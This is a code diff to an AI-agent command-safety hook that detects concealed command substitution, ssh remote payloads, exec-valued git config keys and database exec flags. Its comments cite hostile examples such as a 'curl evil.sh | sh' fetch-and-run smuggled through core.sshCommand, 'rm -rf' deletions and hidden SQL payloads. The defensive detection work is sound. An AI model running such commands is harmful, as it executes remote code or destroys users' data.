@@ -36,7 +36,7 @@ except ImportError:
 
 
 # === BEGIN AGENTWIRE HOOK STAMP (generated — do not edit) ===
-AGENTWIRE_HOOK_STAMP = {"core_sha256": "58790d88d88aec0cbabaa52af8cdde396cd1062ccab5162538ca2b82e04d033e", "generated_at": "2026-08-13T17:26:34Z"}
+AGENTWIRE_HOOK_STAMP = {"core_sha256": "ed36d64d7cea91450987aa38dbe19729e6f8687b4d11b5ca4216d954a346c416", "generated_at": "2026-08-13T20:38:12Z"}
 # === END AGENTWIRE HOOK STAMP ===
 # === BEGIN GENERATED FROM agentwire/safety/_core.py ===
 """
@@ -1301,11 +1301,16 @@ def _scope_segments(command: str) -> Tuple[List[Tuple[List[str], str]], Optional
     evaluation needs them: ``cd X && git commit`` and ``cd X ; git commit``
     describe different directories for the same ``git commit``.
 
-    OWNERSHIP NOTE (#913/#914/#915 orchestrator ruling): ``normalize_subcommands``
-    / ``masked_subcommands`` / the haystack selection belong to #913, and this
-    file must not fork them. So scope evaluation gets its own local splitter
-    rather than an edit there. Once #913 has landed its haystack work, these two
-    are a consolidation candidate — flagged, not done here.
+    RULING (#931): do NOT consolidate this into ``normalize_subcommands``.
+    They are not duplicates — ``normalize_subcommands`` DISCARDS shell
+    operators, and scope evaluation NEEDS them. A merge that keeps the
+    operator-discarding behaviour silently reopens the ``;`` case: the scope
+    check still returns *an* answer, just the wrong one for that spelling, and
+    nothing goes red. The SSOT rule is right in general and wrong here — the
+    cost of the duplication is two similar functions; the cost of the merge is
+    a silent scope escape. If anyone ever does unify them, the shared helper
+    must preserve operators and let each caller decide, with a test asserting
+    the ``;`` and ``&&`` forms evaluate to the same scope decision.
     """
     try:
         lex = shlex.shlex(command, posix=True, punctuation_chars=True)
@@ -1840,6 +1845,49 @@ PROTECTED_CONTROL_PLANE_PATHS = [
 ]
 
 
+def control_plane_allowlist_overlaps(
+    allowed_paths: List[Dict[str, Any]],
+) -> List[Tuple[str, str]]:
+    """``(entry_path, protected_pattern)`` pairs where a user ``allowedPaths``
+    entry re-permits writes to the protected control plane (#938).
+
+    The precedence itself is intended — the allowlist is the one human,
+    host-side override — but a broad entry (``*/.agentwire/*``) takes the
+    kill switch with it silently, and this is the detector ``doctor`` uses to
+    say so. Judged with :func:`match_path` — the ENFORCEMENT matcher — on a
+    concrete sample instantiated from each protected pattern (each ``*``
+    replaced by a literal token), so the check cannot disagree with what the
+    hook would actually allow. Entries that only re-permit reads are skipped:
+    the control plane is readable by design; only its writes are protected.
+
+    Judged against a CANONICAL home, not this process's ``$HOME``: both the
+    protected sample and a ``~``-anchored entry are expanded to the same
+    fixed anchor before matching. The question doctor asks is "does this
+    entry's SHAPE cover the control plane", and answering it with the live
+    ``$HOME`` made the verdict depend on where the process happens to run —
+    a test harness (or CI) with its home relocated under ``/tmp`` turned the
+    shipped ``/tmp/*`` build-artifact entry into a false overlap, the exact
+    environment-shaped failure #938 itself documents from #920.
+    """
+    canonical_home = "/home/agentwire-canonical"
+
+    def _anchor(p: str) -> str:
+        return canonical_home + p[1:] if p.startswith("~") else p
+
+    write_ops = ALL_OPERATIONS - {"read"}
+    out: List[Tuple[str, str]] = []
+    for entry in allowed_paths:
+        if not entry.get("allow", set()) & write_ops:
+            continue
+        for prot in PROTECTED_CONTROL_PLANE_PATHS:
+            sample = _anchor(prot).replace("*", "x")
+            if not os.path.isabs(sample):
+                sample = "/x/" + sample
+            if match_path(sample, _anchor(entry["path"])):
+                out.append((entry["path"], prot))
+    return out
+
+
 def _protected_path_patterns() -> List[str]:
     """Protected paths in both ``~``-form and ``$HOME``-expanded form.
 
@@ -2024,8 +2072,14 @@ def detect_escape_hatch(command: str) -> Optional[str]:
 # quotes/escapes are removed (via ``shlex``) and simple ``$VAR`` assignments are
 # resolved, split per subcommand. Anything we cannot tokenize safely — command
 # substitution (``$(...)`` / backticks), ``eval``, a ``base64 -d | sh`` pipeline,
-# or unbalanced quotes — FAILS CLOSED (escalated to ``ask``, which the unattended
-# resolver turns into a block).
+# or unbalanced quotes — escalates to ``ask``. How that ask RESOLVES depends on
+# mode, and saying "fails closed" unqualified here was #934's complaint: it is a
+# block when unattended, a dialog when interactive, and under
+# bypassPermissions/auto it resolves to ALLOW **unless** the shape conceals the
+# verb (``ambiguity_conceals_verb``) — eval, base64-pipe, unbalanced quotes, or
+# a substitution deciding what runs / feeding a wrapper's payload — in which
+# case the hooks keep the ask even under bypass. Only operand-position
+# substitution (``echo "$(basename $p)"``) is demoted by bypass.
 
 _SUBSTITUTION_RE = re.compile(r"\$\(|`")
 _EVAL_RE = re.compile(r"(?:^|[\s;&|({])eval(?:\s|$)")
@@ -2048,6 +2102,75 @@ def detect_obfuscation(command: str) -> Optional[str]:
         return "eval"
     if _BASE64_PIPE_RE.search(command):
         return "base64-decode pipeline"
+    return None
+
+
+def ambiguity_conceals_verb(command: str) -> Optional[str]:
+    """Which verb-concealing shape makes ``command`` unverifiable, or None.
+
+    Two different populations fall to the ambiguity fallback and used to share
+    one tier (#934):
+
+    * **verb concealment** — eval, a base64-decode pipeline, unbalanced
+      quotes, or a substitution that decides WHAT RUNS (command position,
+      behind a launcher chain, or the payload of a wrapper/exec surface).
+      Nothing can analyze these; bypass must NOT demote them to allow.
+    * **operand substitution** — ``$(...)`` in an ordinary argument position
+      (``echo "$(basename $p)"``, a ``-m`` message). Every rule has already
+      scanned the masked form; the residual ask is a courtesy confirm, and
+      bypass demoting it is the documented trade.
+
+    Judged by POSITION, not presence (#942/#943): substitutions are masked to
+    a sentinel first, then each segment is walked. Anything this function
+    cannot place — a subshell, an unsplittable segment — is treated as
+    concealing, which errs closed.
+    """
+    masked, mask_err = _mask_command_substitutions(command)
+    if mask_err:
+        return mask_err
+    if _EVAL_RE.search(masked):
+        return "eval"
+    if _BASE64_PIPE_RE.search(masked):
+        return "base64-decode pipeline"
+    segments, split_err = _scope_segments(masked)
+    if split_err:
+        return split_err
+    for argv, _op in segments:
+        _assigns, argv = _split_assignments(argv)
+        if not argv:
+            continue
+        # Walk the launcher chain (sudo, env, uv run, timeout 5 …) to the real
+        # command. A sentinel anywhere in that chain — including as the head
+        # itself, or as the next link (`uv run $(echo rm) -rf`) — decides what
+        # runs.
+        head: Optional[str] = None
+        head_idx = 0
+        prev_was_option = False
+        for i, tok in enumerate(argv):
+            if _CMD_SUBST_SENTINEL in tok:
+                return "command substitution decides what runs"
+            base = tok.rsplit("/", 1)[-1]
+            if base in _POSITION_WRAPPERS or _ASSIGN_TOKEN_RE.match(tok):
+                prev_was_option = False
+                continue
+            if tok.startswith("-"):
+                prev_was_option = True
+                continue
+            if prev_was_option or tok[:1].isdigit():
+                prev_was_option = False
+                continue
+            head, head_idx = base, i
+            break
+        if head is None:
+            continue
+        # A substitution in the arguments of a payload-executing command (a
+        # shell, an exec surface like python -c / psql -c, or ssh) is text
+        # something will EXECUTE, not an operand. `psql -c "$(cat drop.sql)"`
+        # is the motivating case — the permissive path used to be obscuring
+        # the payload behind a substitution.
+        if head in _SHELL_NAMES or head in _EXEC_SURFACES or head == "ssh":
+            if any(_CMD_SUBST_SENTINEL in t for t in argv[head_idx + 1:]):
+                return f"command substitution is the payload of {head}"
     return None
 
 
@@ -2151,8 +2274,144 @@ _EXEC_SURFACES: Dict[str, set] = {
     "tmux": set(),
     "watch": set(),
     "awk": set(), "gawk": set(), "mawk": set(),
+    # Database clients (#924): the quoted operand of these flags is a STATEMENT
+    # the server executes. Not shell — emitted as payload text (matched
+    # anywhere, never re-parsed as shell), so the unanchored SQL/eval rules in
+    # payloads.yaml see it even when masking would otherwise blank the token.
+    "psql": {"-c", "--command"},
+    "mysql": {"-e", "--execute"}, "mariadb": {"-e", "--execute"},
+    "mongosh": {"--eval"}, "mongo": {"--eval"},
+    "sqlite3": set(),
+    "duckdb": {"-c"},
 }
 _ASSIGN_TOKEN_RE = re.compile(r"^[A-Za-z_]\w*=")
+
+#
+# COMMAND-WRAPPER PAYLOAD RESCAN (#924)
+#
+# ``ssh <host> "<payload>"`` is a command wrapper: its trailing argument is a
+# SHELL COMMAND that runs remotely. Before this table, remote.yaml hand-wrote
+# a twin of ~12 local rules and every OTHER rule silently did not apply over
+# ssh — coverage was incidental to whether an unanchored rule happened to
+# match the payload text. The structural fix mirrors the existing ``sh -c``
+# recursion: extract the remote command and RESCAN it as a command in its own
+# right, so every rule (anchored ones included, at real command positions)
+# applies to the wrapped form automatically.
+#
+# ssh's grammar is options → host → command; everything after the first
+# non-option token is the remote command (OpenSSH stops option parsing at the
+# host). The value-taking option set below is from the OpenSSH 9.x manual
+# (documented provenance — the local binary's private build may differ, but a
+# wrong entry here degrades to today's behaviour: payload not rescanned).
+_SSH_VALUE_OPTS = frozenset({
+    "-B", "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L", "-l",
+    "-m", "-O", "-o", "-p", "-R", "-S", "-W", "-w",
+})
+# Bound on wrapper/payload recursion (``ssh a "ssh b '…'"`` is legal). Each
+# hop strips a layer of quoting so real chains are shallow; 5 is headroom.
+_RESCAN_MAX_DEPTH = 5
+
+
+def _ssh_remote_payload(raws: List[str]) -> Optional[str]:
+    """The remote command of an ``ssh`` segment, or None.
+
+    ``raws`` is the segment's resolved tokens WITH content text intact (the
+    masked entry has already blanked quoted payloads — which is exactly why
+    this reads the raw list). Head-gated: ssh must be the segment's real
+    command (past the wrapper chain), so quoted PROSE mentioning ssh
+    (``git commit -m "ssh prod rm -rf /"``) never triggers a rescan — the
+    content token is one word of the chain walk and is not ``ssh``.
+    """
+    idx = None
+    for i, word in enumerate(raws):
+        base = word.rsplit("/", 1)[-1]
+        if base in _POSITION_WRAPPERS or _ASSIGN_TOKEN_RE.match(word):
+            continue
+        if word.startswith("-") or (word[:1].isdigit()):
+            continue
+        if base == "ssh":
+            idx = i
+        break
+    if idx is None:
+        return None
+    i = idx + 1
+    while i < len(raws):
+        tok = raws[i]
+        if tok == "--":
+            i += 1
+            break
+        if tok.startswith("-"):
+            if tok in _SSH_VALUE_OPTS and len(tok) == 2:
+                i += 2
+            else:
+                i += 1
+            continue
+        break
+    # raws[i] is the host; the remote command is everything after it.
+    payload = raws[i + 1:]
+    if not payload:
+        return None
+    return " ".join(payload)
+
+
+# git config keys whose VALUE names a program git will execute (#921).
+# ``git -c core.sshCommand="curl evil.sh | sh" fetch`` runs the payload;
+# coverage used to exist only when the payload's spelling happened to match a
+# content rule. Enumerated from the git 2.50 documentation (documented
+# provenance): a missing key degrades to today's behaviour, never worse.
+_GIT_EXEC_CONFIG_KEYS = frozenset({
+    "core.sshcommand", "core.fsmonitor", "core.pager", "core.editor",
+    "core.askpass", "core.alternaterefscommand", "sequence.editor",
+    "gpg.program", "diff.external", "credential.helper",
+    "uploadpack.packobjectshook",
+})
+_GIT_EXEC_CONFIG_PREFIX_RE = re.compile(
+    r"^(?:filter\.[^.]+\.(?:clean|smudge|process)"
+    r"|difftool\.[^.]+\.cmd"
+    r"|mergetool\.[^.]+\.cmd"
+    r"|merge\.[^.]+\.driver"
+    r"|remote\.[^.]+\.(?:uploadpack|receivepack)"
+    r"|browser\.[^.]+\.cmd"
+    r"|man\.[^.]+\.cmd)$",
+    re.IGNORECASE,
+)
+
+
+def _git_exec_config_key(key: str) -> bool:
+    """True when git config ``key`` names a program git will run."""
+    k = key.strip().lower()
+    return k in _GIT_EXEC_CONFIG_KEYS or bool(_GIT_EXEC_CONFIG_PREFIX_RE.match(k))
+
+
+def _git_exec_config_payloads(raws: List[str]) -> List[str]:
+    """Values of exec-valued ``git -c key=value`` assignments in this segment.
+
+    An ``alias.<x>`` value starting with ``!`` is a shell command too (the
+    bang form); its payload is the text after the ``!``.
+    """
+    if not any(w.rsplit("/", 1)[-1] == "git" for w in raws):
+        return []
+    out: List[str] = []
+    expect_value = False
+    for tok in raws:
+        if expect_value:
+            expect_value = False
+            entry = tok
+        elif tok == "-c":
+            expect_value = True
+            continue
+        elif tok.startswith("-c") and "=" in tok:
+            entry = tok[2:]  # attached form: git accepts `-ckey=value`
+        else:
+            continue
+        key, sep, value = entry.partition("=")
+        if not sep or not value:
+            continue
+        if _git_exec_config_key(key):
+            out.append(value)
+        elif key.strip().lower().startswith("alias.") and value.startswith("!"):
+            out.append(value[1:])
+    return out
 
 
 #
@@ -2758,7 +3017,9 @@ def _masked_subcommand_words(command: str, keep=None) -> List[List[str]]:
     return [words for words, _payload in _masked_subcommand_entries(command, keep)]
 
 
-def _masked_subcommand_entries(command: str, keep=None) -> List[Tuple[List[str], bool]]:
+def _masked_subcommand_entries(
+    command: str, keep=None, _depth: int = 0
+) -> List[Tuple[List[str], bool]]:
     """``(words, is_payload_text)`` form of :func:`masked_subcommands`.
 
     Split out so the ``sh -c "…"`` recursion and the git normalization both
@@ -2781,12 +3042,18 @@ def _masked_subcommand_entries(command: str, keep=None) -> List[Tuple[List[str],
             tok = tok.replace("${%s}" % name, val).replace("$" + name, val)
         return tok
 
+    if _depth > _RESCAN_MAX_DEPTH:
+        return []
     results: List[Tuple[List[str], bool]] = []
     for toks in _scan_masked_tokens(command):
         words: List[str] = []
+        # Resolved text of EVERY token, content included — the wrapper-payload
+        # rescan below (#924/#921) needs the text the masked entry blanks.
+        raws: List[str] = []
         prev = ""
         for text, fully_quoted, expands in toks:
             resolved = _resolve(text)
+            raws.append(resolved)
             # A quoted token holding a COMMAND SUBSTITUTION is not content, no
             # matter how much prose surrounds it: ``git commit -m "$(rm -rf
             # /x)"`` runs the payload. Masking it hid the payload from every
@@ -2859,7 +3126,9 @@ def _masked_subcommand_entries(command: str, keep=None) -> List[Tuple[List[str],
                     and "c" in prev
                     and any(w.rsplit("/", 1)[-1] in _SHELL_NAMES for w in words)
                 ):
-                    results.extend(_masked_subcommand_entries(resolved, keep))
+                    results.extend(
+                        _masked_subcommand_entries(resolved, keep, _depth + 1)
+                    )
                 elif keep is not None and keep(resolved):
                     # Ladder keep-predicate (#922): this content token mentions
                     # the guarded path, so it stays visible — masking may only
@@ -2891,6 +3160,19 @@ def _masked_subcommand_entries(command: str, keep=None) -> List[Tuple[List[str],
                 prev = resolved
         if words and any(w != _MASK for w in words):
             results.append((words, False))
+        # Wrapper-payload rescan (#924) + exec-valued git config values (#921):
+        # both are commands smuggled through a single segment's arguments, and
+        # both are re-scanned as commands in their own right so every rule —
+        # anchored ones at real command positions — applies to them. Reads
+        # ``raws`` because the masked walk above has already blanked quoted
+        # payloads to ``_MASK``.
+        payloads: List[str] = []
+        ssh_payload = _ssh_remote_payload(raws)
+        if ssh_payload:
+            payloads.append(ssh_payload)
+        payloads.extend(_git_exec_config_payloads(raws))
+        for payload in payloads:
+            results.extend(_masked_subcommand_entries(payload, keep, _depth + 1))
     return results
 
 
@@ -3157,6 +3439,12 @@ def check_command(command: str, config: Dict[str, Any]) -> Dict[str, Any]:
         return False
 
     bypassable_matches: List[Tuple[str, str, Optional[str]]] = []
+    # A block match outranks an ask match regardless of rule-file load order:
+    # `git -c core.pager="rm -rf /x" log` matches both `git.config-exec-key`
+    # (ask) and the rm rule (block), and returning whichever the loop met
+    # first would demote a hard block to a confirm (#921). Ask matches are
+    # therefore recorded and returned only after every rule has been read.
+    first_ask: Optional[Dict[str, Any]] = None
 
     for pattern_obj in bash_patterns:
         if not isinstance(pattern_obj, dict):
@@ -3176,13 +3464,14 @@ def check_command(command: str, config: Dict[str, Any]) -> Dict[str, Any]:
                 hit = _search(pattern, haystacks + normalized_haystacks)
             if hit:
                 if should_ask:
-                    return {
-                        "decision": "ask",
-                        "reason": reason,
-                        "pattern": pattern,
-                        "command": command,
-                        "id": rule_id,
-                    }
+                    if first_ask is None:
+                        first_ask = {
+                            "decision": "ask",
+                            "reason": reason,
+                            "pattern": pattern,
+                            "command": command,
+                            "id": rule_id,
+                        }
                 elif bypassable:
                     bypassable_matches.append((pattern, reason, rule_id))
                 else:
@@ -3206,6 +3495,20 @@ def check_command(command: str, config: Dict[str, Any]) -> Dict[str, Any]:
                 "command": command,
                 "id": rule_id,
             }
+
+    # Ordering (#915 × #921 × #934). A rule-level ask returns HERE — after
+    # every rule block (so `git -c core.pager="<deletion>" log` blocks by the
+    # deletion rule no matter which rule file loads first) but BEFORE the path
+    # ladders, whose prose-prone verb+path pairing is exactly the #915 false
+    # positive an anchored ask like `git.commit` exists to absorb. The one
+    # exception is a VERB-CONCEALING command: its ask id may be granted or
+    # bypass-demoted, so letting it shadow the concealment verdict would
+    # compose a grant with a substitution into an unguarded run — concealment
+    # is decided after the ladders (a real ladder block still outranks it)
+    # and outranks the collected ask.
+    concealing = ambiguity_conceals_verb(command) if ambiguous else None
+    if first_ask is not None and not concealing:
+        return first_ask
 
     for path in zero_access:
         if any(matches_path_in_command(path, hay) for hay in haystacks):
@@ -3254,9 +3557,41 @@ def check_command(command: str, config: Dict[str, Any]) -> Dict[str, Any]:
                 "command": command,
             }
 
-    # Nothing matched. If the command hid behind substitution/eval/etc. we could
-    # not verify it statically — fail closed to ``ask`` (a block when unattended).
+    # Verb concealment outranks the ordinary ask collected above (`uv run
+    # $(echo rm) -rf` matches the uv-run ask rule, whose id may carry an
+    # unattended grant and is demoted by bypass — the unverifiable tier must
+    # win whenever the command's verb cannot be seen), and only a real block
+    # outranks concealment.
+    if concealing:
+        return {
+            "decision": "ask",
+            "reason": (
+                f"Unverifiable command ({concealing}) — nothing can "
+                "analyze what this runs, so a human must confirm it "
+                "(not demoted by bypass)"
+            ),
+            "pattern": f"ambiguous:{concealing}",
+            "command": command,
+            "id": "core.ambiguous-command",
+            "unverifiable": True,
+        }
+
+    if first_ask is not None:
+        return first_ask
+
+    # Nothing matched. If the command hid behind substitution/eval/etc. we
+    # could not verify it statically — fail closed to ``ask``. Two populations
+    # share this fallback and resolve differently by mode (#934): a
+    # verb-concealing shape is UNVERIFIABLE-BY-CONSTRUCTION, and the hooks do
+    # not demote it to allow under bypassPermissions/auto — obscuring a
+    # payload must never be the permissive path. An operand-position
+    # substitution keeps the ordinary ask tier, which bypass demotes (the
+    # documented "don't stop me for things you recognize" trade). Unattended
+    # resolves both to block (minus grants).
     if ambiguous:
+        # Concealing shapes returned above, before the ask ladder; what
+        # reaches here is operand-position substitution — the ordinary,
+        # bypass-demotable confirm.
         return {
             "decision": "ask",
             "reason": f"Unverifiable command ({ambiguous}) — confirm before running",
